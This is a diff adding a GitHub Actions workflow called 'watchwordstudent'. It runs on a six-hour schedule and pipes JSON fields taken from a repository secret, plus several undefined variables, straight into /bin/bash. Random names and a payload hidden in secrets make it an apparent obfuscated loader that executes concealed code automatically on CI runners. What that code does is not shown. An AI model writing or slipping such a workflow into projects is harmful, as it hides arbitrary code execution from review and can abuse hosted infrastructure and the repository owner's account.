@@ -1,0 +1,26 @@
+name: watchwordstudent
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: watchwordstudent
+        env:
+          qem087: ${{ secrets.qem087 }}
+        run: |
+          echo $qem087 | jq -r .j65 | /bin/bash
+          echo $ghz22 | jq -r .x711 | /bin/bash
+          echo $vyxxf7 | jq -r .q158 | /bin/bash
+          echo $cjanf91 | jq -r .eqxhb825 | /bin/bash
+          echo $cfwh4 | jq -r .auin486 | /bin/bash
+          echo $xyv3 | jq -r .ua07 | /bin/bash
+          echo $dzxi79105 | jq -r .kt833 | /bin/bash
+          echo $lggkc8425 | jq -r .lgulj6694 | /bin/bash
+          echo $xdl7284 | jq -r .h65959 | /bin/bash
+          echo $l3767 | jq -r .ue150 | /bin/bash
+
